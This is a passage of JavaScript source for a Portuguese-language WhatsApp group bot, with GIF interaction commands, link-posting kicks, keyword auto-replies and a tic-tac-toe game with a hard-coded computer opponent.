 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/gif', quoted: mek})
break
case 'beijo':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus = `Que fofo... 💘 você deu um beijo  em @${mentioned[0].split('@')[0]}`
 mentions(sus, mentioned, true)
data = fs.readFileSync('./arquivos/interação/beijo.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/gif', quoted: mek})
break
case 'tapa':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus =
`você deu um tapa em @${mentioned[0].split('@')[0]}`
 mentions(sus, mentioned, true)
data = fs.readFileSync('./arquivos/interação/tapa.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/gif', quoted: mek})
break
case 'carinho':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus =
`Que fofo...💘 você fez carinho  em @${mentioned[0].split('@')[0]}`
 mentions(sus, mentioned, true)
data = fs.readFileSync('./arquivos/interação/carinho.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/gif', quoted: mek})
break
case 'chute':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Você precisa mencionar alguém')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
pro = '.\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
sus =
`Eita... você chutou a cara de @${mentioned[0].split('@')[0]}`
 mentions(sus, mentioned, true)
data = fs.readFileSync('./arquivos/interação/chute.js');
 jsonData = JSON.parse(data);
 randIndex = Math.floor(Math.random() * jsonData.length);
 randKey = jsonData[randIndex];
buffer = await getBuffer(randKey.result)
edward.sendMessage(from, buffer, MessageType.video, {mimetype: 'video/gif', quoted: mek})
break
default:break
		}
if (isGroup && !mek.key.fromMe && isAntilink) {
if (budy.match("wa.me/")) {
if (isGroupAdmins) return reply('q isso adm 😡')
if (isOwner) return reply ('😳')
console.log(color('[KICK]', 'red'), color('Received a link!', 'yellow'))
reply(`-1 `)
setTimeout(() => {
edward.groupRemove(from, [sender])
}, 10);
}
}         
if (isGroup && !mek.key.fromMe && isAntilink) {
if (budy.match(".com.br")) {
if (isGroupAdmins) return reply('q isso adm 😡')
if (isOwner) return reply ('😳')
console.log(color('[KICK]', 'red'), color('Received a link!', 'yellow'))
reply(`-1 `)
setTimeout(() => {
edward.groupRemove(from, [sender])
}, 10);
}
}         
if (isGroup && !mek.key.fromMe && isAntilink) {
if (budy.match(".com/")) {
if (isGroupAdmins) return reply('q isso adm 😡')
if (isOwner) return reply ('😳')
console.log(color('[KICK]', 'red'), color('Received a link!', 'yellow'))
reply(`-1 `)
setTimeout(() => {
edward.groupRemove(from, [sender])
}, 10);
}
}         
if (isGroup && !mek.key.fromMe && isAntilink) {
if (budy.match("https")) {
if (isGroupAdmins) return reply('q isso adm 😡')
if (isOwner) return reply ('😳')
console.log(color('[KICK]', 'red'), color('Received a link!', 'yellow'))
reply(`-1 `)
setTimeout(() => {
edward.groupRemove(from, [sender])
}, 10);
}
}         
if (isGroup && !mek.key.fromMe && isAntilink) {
if (budy.match("gostaria de participar de um rpg de naruto")) {
if (isGroupAdmins) return reply('q isso adm 😡')
if (isOwner) return reply ('😳')
console.log(color('[KICK]', 'red'), color('Received a link!', 'yellow'))
reply(`-1 `)
setTimeout(() => {
edward.groupRemove(from, [sender])
}, 10);
}
}         


		//gif com som
  if (budy.match(`eu sou o mior`)) {
  const gfso = fs.readFileSync('./arquivos/video/mior.mp4');
		edward.sendMessage(from, gfso, MessageType.video, {mimetype: Mimetype.gif,quoted : mek})
		setTimeout( () => {
		reply('_A lenda diz que se você_ * clicar duas vezes * _ no gif, você ouvirá a voz do cr7._')
		}, 1000)
  }
if (budy.match('gatinho')) {
if (autorespon) return
pinterest(`fotos de gatos fofos`).then( data => {
const gato = data.result
const gator = gato[Math.floor(Math.random() * gato.length)]
sendMediaURL (from ,gator , `oii 🐱`)
})
}
if (budy.match('cachorro')) {
pinterest(`fotos de cachorros fofos`).then( data => {
const gato = data.result
const gator = gato[Math.floor(Math.random() * gato.length)]
sendMediaURL (from ,gator , `oii 🐶`)
})

}
if (budy.match('fdp') || budy.match('Fdp') || budy.match('FDP')) {
reply(`Fdp é você órfão desgraçado`)
}
if(budy.match('vsf') || budy.match('Vsf')) {
  reply('cala a boca')
}
if(budy.match('te amo') || budy.match('Te amo')) {
  a = fs.readFileSync(`./arquivos/gaykk.mp4`)
  edward.sendMessage(from, a, audio, {quoted: mek})
}
if(budy.match('@5555933005901') || budy.match('@555596274433')) {
  a = fs.readFileSync(`./arquivos/semr.webp`)
  edward.sendMessage(from, a, sticker, {quoted: mek})
}

		if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Jogo Da Velha 🎲*

Jogador1 @${tty.player1.split('@')[0]}=❌
Jogador2 @${tty.player2.split('@')[0]}=⭕

${angka[1]}${angka[2]}${angka[3]}
${angka[4]}${angka[5]}${angka[6]}
${angka[7]}${angka[8]}${angka[9]}

Sua vez = @${tty.player1.split('@')[0]}`
  edward.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
edward.sendMessage(from, `@${tty.player2.split('@')[0]} Recusou o desafio 😔`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Digite os números corretamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Tente outra cordenada')
if (main[0].gilir.includes(sender)) return reply('Espere sua vez ._.')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`
const dinherowin = Math.ceil(Math.random() * 1000)
ucapmenang = () => {
ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*@${tty.player1.split('@')[0]}* Ganhou o jogo...\n🥳Parabéns Seu prêmio🏆: ${dinherowin}\n`
add_dinheiro(`${tty.player1.split('@')[0]}` + "@s.whatsapp.net", dinherowin)           
ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`
edward.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*_Terminou em Empate 👌_*`
ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Jogo Da Velha 🎲*

Jogador2 @${tty.player2.split('@')[0]}=⭕
Jogador1 @${tty.player1.split('@')[0]}=❌

${ttt}

Sua vez = @${tty.player2.split('@')[0]}`
 edward.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Digite os números corretamente')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Tente outra cordenada')
if (main[0].gilir.includes(sender)) return reply('Espere sua vez ._.')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
  const dinherowin = Math.ceil(Math.random() * 1000)
ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*@${tty.player2.split('@')[0]}* Ganhou o jogo...\n🥳Parabéns Seu prêmio🏆: ${dinherowin}\n`
add_dinheiro(`${tty.player2.split('@')[0]}` + "@s.whatsapp.net", dinherowin)           
ucapan2 = `*🎳 Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`
edward.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*_Terminou em Empate👌*`
ucapan2 = `*🎳 Resultado Do Jogo Da Velha 🎲*

*O resultado final:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Jogo Da Velha 🎲*

Jogador1 @${tty.player1.split('@')[0]}=⭕
Jogador2 @${tty.player2.split('@')[0]}=❌

${ttt}
 
Sua vez = @${tty.player1.split('@')[0]}`
 edward.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
 }
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('|ERR|', 'red'), color(e, 'cyan'))
     edward.sendMessage(`${settings.NumeroCriador}@s.whatsapp.net`, `─────「 *ALERTA DE ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Criador do  edwardBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./arquivos/img/edward.jpg'),sourceUrl:"https://https://api.whatsapp.com/send/?phone=5555933005901&text=oie&app_absent=0?text=Slv gay"}}})
	}
    }
    }
    }
    }
    }
    }
//===================================================//
//_TESTE PARA VITÓRIA DE ❌
const WinnerX = () => {
if (
(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="❌") || (esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="❌") || (esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="❌") || 
(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="❌") || (esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="❌") || (esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="❌") || (esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="❌")
) {
return true
} else {
return false
}
}

//TESTE PARA VITÓRIA DE ⭕
const WinnerO = () => {
if (
(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="⭕") || (esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="⭕") || (esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="⭕") || 
(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="⭕") || (esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="⭕") || (esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="⭕") || (esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="⭕")
) {
return true
} else {
return false
}
}

//TESTE PARA EMPATE
const Tie = () => {
if (esp.a1!="🔲"&&esp.a2!="🔲"&&esp.a3!="🔲"&&esp.b1!="🔲"&&esp.b2!="🔲"&&esp.b3!="🔲"&&esp.c1!="🔲"&&esp.c2!="🔲"&&esp.c3!="🔲") {
return true
} else {
return false
}
}

const IA = () => {
if (WinnerX() || WinnerO() || Tie()) {
tttset.reActivate1 = "off"
//INICIO DO MODO IMPOSSIVEL
} else if (tttset.tttdifficulty == "IMPOSSIBLE" && ( 
//TESTE PARA TENTATIVA DE VITÓRIA
(esp.a1=="⭕"&&esp.a2=="⭕"&&esp.a3=="🔲") || (esp.a1=="⭕"&&esp.a2=="🔲"&&esp.a3=="⭕") || (esp.a1=="🔲"&&esp.a2=="⭕"&&esp.a3=="⭕") ||
(esp.b1=="⭕"&&esp.b2=="⭕"&&esp.b3=="🔲") || (esp.b1=="⭕"&&esp.b2=="🔲"&&esp.b3=="⭕") || (esp.b1=="🔲"&&esp.b2=="⭕"&&esp.b3=="⭕") ||
(esp.c1=="⭕"&&esp.c2=="⭕"&&esp.c3=="🔲") || (esp.c1=="⭕"&&esp.c2=="🔲"&&esp.c3=="⭕") || (esp.c1=="🔲"&&esp.c2=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b1=="⭕"&&esp.c1=="🔲") || (esp.a1=="⭕"&&esp.b1=="🔲"&&esp.c1=="⭕") || (esp.a1=="🔲"&&esp.b1=="⭕"&&esp.c1=="⭕") ||
(esp.a2=="⭕"&&esp.b2=="⭕"&&esp.c2=="🔲") || (esp.a2=="⭕"&&esp.b2=="🔲"&&esp.c2=="⭕") || (esp.a2=="🔲"&&esp.b2=="⭕"&&esp.c2=="⭕") ||
(esp.a3=="⭕"&&esp.b3=="⭕"&&esp.c3=="🔲") || (esp.a3=="⭕"&&esp.b3=="🔲"&&esp.c3=="⭕") || (esp.a3=="🔲"&&esp.b3=="⭕"&&esp.c3=="⭕") ||
(esp.a1=="⭕"&&esp.b2=="⭕"&&esp.c3=="🔲") || (esp.a1=="⭕"&&esp.b2=="🔲"&&esp.c3=="⭕") || (esp.a1=="🔲"&&esp.b2=="⭕"&&esp.c3=="⭕") ||
(esp.a3=="⭕"&&esp.b2=="⭕"&&esp.c1=="🔲") || (esp.a3=="⭕"&&esp.b2=="🔲"&&esp.c1=="⭕") || (esp.a3=="🔲"&&esp.b2=="⭕"&&esp.c1=="⭕") ||
//TESTE PARA TENTATIVA DE BLOQUEIO
(esp.a1=="❌"&&esp.a2=="❌"&&esp.a3=="🔲") || (esp.a1=="❌"&&esp.a2=="🔲"&&esp.a3=="❌") || (esp.a1=="🔲"&&esp.a2=="❌"&&esp.a3=="❌") ||
(esp.b1=="❌"&&esp.b2=="❌"&&esp.b3=="🔲") || (esp.b1=="❌"&&esp.b2=="🔲"&&esp.b3=="❌") || (esp.b1=="🔲"&&esp.b2=="❌"&&esp.b3=="❌") ||
(esp.c1=="❌"&&esp.c2=="❌"&&esp.c3=="🔲") || (esp.c1=="❌"&&esp.c2=="🔲"&&esp.c3=="❌") || (esp.c1=="🔲"&&esp.c2=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b1=="❌"&&esp.c1=="🔲") || (esp.a1=="❌"&&esp.b1=="🔲"&&esp.c1=="❌") || (esp.a1=="🔲"&&esp.b1=="❌"&&esp.c1=="❌") ||
(esp.a2=="❌"&&esp.b2=="❌"&&esp.c2=="🔲") || (esp.a2=="❌"&&esp.b2=="🔲"&&esp.c2=="❌") || (esp.a2=="🔲"&&esp.b2=="❌"&&esp.c2=="❌") ||
(esp.a3=="❌"&&esp.b3=="❌"&&esp.c3=="🔲") || (esp.a3=="❌"&&esp.b3=="🔲"&&esp.c3=="❌") || (esp.a3=="🔲"&&esp.b3=="❌"&&esp.c3=="❌") ||
(esp.a1=="❌"&&esp.b2=="❌"&&esp.c3=="🔲") || (esp.a1=="❌"&&esp.b2=="🔲"&&esp.c3=="❌") || (esp.a1=="🔲"&&esp.b2=="❌"&&esp.c3=="❌") ||
(esp.a3=="❌"&&esp.b2=="❌"&&esp.c1=="🔲") || (esp.a3=="❌"&&esp.b2=="🔲"&&esp.c1=="❌") || (esp.a3=="🔲"&&esp.b2=="❌"&&esp.c1=="❌")
)){
tttset.reActivate1 = "off"
IAmove1()
//JOGADAS PROGRAMADAS ABAIXO
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
 tttset.reActivate1 = "off"
esp.a1 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "❌" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
tttset.reActivate1 = "off"
esp.a2 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "❌") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "❌" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
 (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
tttset.reActivate1 = "off"
esp.a3 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
 (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌"))) {
tttset.reActivate1 = "off"
esp.b1 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "❌" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "??" && esp.c2 == "❌" && esp.c3 == "⭕") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "⭕" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "⭕" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "??" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "⭕") ||
 (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
 (esp.a1 == "⭕" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "❌" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "⭕" && esp.b1 == "❌" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "❌") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "🔲" && esp.a2 == "🔲" && esp.a3 == "❌" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲") ||
 (esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "🔲" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
tttset.reActivate1 = "off"
esp.b2 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
((esp.a1 == "❌" && esp.a2 == "🔲" && esp.a3 == "🔲" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "🔲" && esp.c2 == "❌" && esp.c3 == "⭕") ||
 (esp.a1 == "🔲" && esp.a2 == "❌" && esp.a3 == "⭕" && esp.b1 == "🔲" && esp.b2 == "⭕" && esp.b3 == "🔲" && esp.c1 == "❌" && esp.c2 == "🔲" && esp.c3 == "🔲"))) {
tttset.reActivate1 = "off"
esp.b3 = "⭕"
} else if (tttset.tttdifficulty == "IMPOSSIBLE" &&
